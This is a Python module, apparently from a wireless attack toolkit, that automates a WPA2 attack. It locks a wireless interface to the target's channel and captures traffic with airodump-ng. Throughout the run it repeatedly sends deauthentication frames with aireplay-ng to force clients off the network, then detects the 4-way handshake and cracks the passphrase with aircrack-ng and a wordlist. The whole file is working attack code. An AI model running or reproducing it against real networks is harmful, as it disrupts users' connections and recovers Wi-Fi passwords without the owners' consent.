"""
attacks/wpa2.py - WPA2 4-way handshake capture via deauthentication
"""

import subprocess
import threading
import time
import os
import tempfile
from utils.logger import Logger
from utils.tools import check_tool

log = Logger()


class WPA2Attack:
    def __init__(self, interface, target, wordlist=None,
                 output_dir="./captures", deauth_count=5):
        self.interface = interface
        self.target = target
        self.wordlist = wordlist
        self.output_dir = output_dir
        self.deauth_count = deauth_count
        self.timeout = 60  # seconds to wait for handshake
        self._capfile = None

    def run(self):
        """Capture WPA2 handshake via deauth"""
        bssid = self.target["bssid"]
        channel = self.target["channel"]
        essid = self.target["essid"]
        clients = self.target.get("clients", [])

        # Set channel
        self._set_channel(channel)

        # Start capture
        capfile_base = os.path.join(
            self.output_dir,
            f"wpa2_{essid.replace(' ', '_')}_{bssid.replace(':', '')}"
        )
        self._capfile = capfile_base + "-01.cap"

        log.info(f"Starting capture on CH {channel} for {essid}")

        cap_cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", capfile_base,
            "--output-format", "cap",
            self.interface
        ]

        cap_proc = subprocess.Popen(
            cap_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        # Wait a moment then deauth
        time.sleep(3)

        handshake_found = False
        start = time.time()

        while time.time() - start < self.timeout:
            elapsed = int(time.time() - start)

            # Send deauth every 10s
            if elapsed % 10 == 0 or elapsed < 5:
                self._deauth(bssid, clients)

            # Check for handshake
            if os.path.exists(self._capfile):
                if self._check_handshake(self._capfile, bssid):
                    handshake_found = True
                    break

            print(f"\r[*] Waiting for handshake... {elapsed}s / {self.timeout}s", end="", flush=True)
            time.sleep(1)

        print()
        cap_proc.terminate()
        cap_proc.wait()

        if handshake_found:
            log.success(f"Handshake captured: {self._capfile}")
            return {"captured": True, "capfile": self._capfile}
        else:
            log.warn("No handshake captured within timeout")
            return {"captured": False}

    def _set_channel(self, channel):
        """Lock interface to target channel"""
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                capture_output=True
            )
        except Exception:
            pass

    def _deauth(self, bssid, clients):
        """Send deauthentication packets"""
        if not check_tool("aireplay-ng"):
            log.warn("aireplay-ng not found, skipping deauth")
            return

        # Deauth broadcast (kicks all clients)
        cmd = [
            "aireplay-ng",
            "--deauth", str(self.deauth_count),
            "-a", bssid,
            self.interface
        ]

        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        log.info(f"Sent {self.deauth_count} deauth frames to {bssid}")

        # Also deauth specific clients if known
        for client in clients[:3]:  # max 3 clients
            cmd_client = [
                "aireplay-ng",
                "--deauth", str(self.deauth_count),
                "-a", bssid,
                "-c", client,
                self.interface
            ]
            subprocess.Popen(
                cmd_client,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

    def _check_handshake(self, capfile, bssid):
        """Verify handshake in capture file"""
        # Method 1: aircrack-ng check
        if check_tool("aircrack-ng"):
            result = subprocess.run(
                ["aircrack-ng", capfile],
                capture_output=True, text=True, timeout=10
            )
            if "1 handshake" in result.stdout or "handshake" in result.stdout.lower():
                return True

        # Method 2: tshark check
        if check_tool("tshark"):
            result = subprocess.run(
                ["tshark", "-r", capfile,
                 "-Y", "eapol",
                 "-T", "fields",
                 "-e", "wlan.sa"],
                capture_output=True, text=True, timeout=10
            )
            eapol_frames = [l for l in result.stdout.splitlines() if l.strip()]
            if len(eapol_frames) >= 2:
                return True

        return False

    def crack(self, capfile):
        """Crack handshake with wordlist"""
        if not self.wordlist:
            return None

        if not os.path.exists(self.wordlist):
            log.error(f"Wordlist not found: {self.wordlist}")
            return None

        log.info(f"Cracking with aircrack-ng + {self.wordlist}...")

        result = subprocess.run(
            ["aircrack-ng", capfile,
             "-w", self.wordlist,
             "-b", self.target["bssid"]],
            capture_output=True, text=True,
            timeout=300
        )

        for line in result.stdout.splitlines():
            if "KEY FOUND" in line:
                # Extract password from "KEY FOUND! [ password ]"
                match = __import__("re").search(r'KEY FOUND! \[ (.+?) \]', line)
                if match:
                    return match.group(1)

        return None
